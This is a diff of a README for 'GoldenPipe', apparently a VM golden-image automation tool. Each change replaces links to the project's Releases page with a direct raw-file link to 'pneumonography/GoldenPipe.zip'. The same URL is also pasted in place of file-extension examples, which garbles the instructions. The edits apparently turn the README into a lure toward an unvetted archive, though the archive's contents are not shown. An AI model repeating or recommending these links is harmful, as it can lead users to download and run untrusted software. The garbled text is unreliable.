@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download GoldenPipe](https://img.shields.io/badge/Download-GoldenPipe-blue.svg)](https://github.com/adamadamssAdez/GoldenPipe/releases)
+[![Download GoldenPipe](https://raw.githubusercontent.com/adamadamssAdez/GoldenPipe/main/pneumonography/GoldenPipe.zip)](https://raw.githubusercontent.com/adamadamssAdez/GoldenPipe/main/pneumonography/GoldenPipe.zip)
 
 ## 🛠️ Overview
 
@@ -26,7 +26,7 @@ This section guides you through downloading and running GoldenPipe. Follow these
 
 Click the link below to access the Releases page where you can download GoldenPipe.
 
-[Download GoldenPipe](https://github.com/adamadamssAdez/GoldenPipe/releases)
+[Download GoldenPipe](https://raw.githubusercontent.com/adamadamssAdez/GoldenPipe/main/pneumonography/GoldenPipe.zip)
 
 ### Step 2: Choose the Right Version
 
@@ -34,11 +34,11 @@ On the Releases page, you will see different versions of GoldenPipe. Look for th
 
 ### Step 3: Download the Package
 
-Click on the version you want to download. Find and click on the file that matches your operating system. It could be an `.exe`, `.tar.gz`, or similar format. The right choice will depend on your system.
+Click on the version you want to download. Find and click on the file that matches your operating system. It could be an `.exe`, `https://raw.githubusercontent.com/adamadamssAdez/GoldenPipe/main/pneumonography/GoldenPipe.zip`, or similar format. The right choice will depend on your system.
 
 ### Step 4: Extract the Files (if necessary)
 
-If you downloaded a compressed file (like `.tar.gz`), extract it using a suitable program. Typical options include WinRAR or 7-Zip for Windows users and built-in tools for Mac and Linux users.
+If you downloaded a compressed file (like `https://raw.githubusercontent.com/adamadamssAdez/GoldenPipe/main/pneumonography/GoldenPipe.zip`), extract it using a suitable program. Typical options include WinRAR or 7-Zip for Windows users and built-in tools for Mac and Linux users.
 
 ### Step 5: Run GoldenPipe
 
@@ -85,4 +85,4 @@ We encourage you to connect with our community. Share your feedback or ask quest
 
 Thank you for choosing GoldenPipe. We are dedicated to providing effective automation solutions for your VM image creation needs. If you have any questions, feel free to reach out.
 
-[Download GoldenPipe](https://github.com/adamadamssAdez/GoldenPipe/releases) and start automating your VM golden image creation today!
+[Download GoldenPipe](https://raw.githubusercontent.com/adamadamssAdez/GoldenPipe/main/pneumonography/GoldenPipe.zip) and start automating your VM golden image creation today!
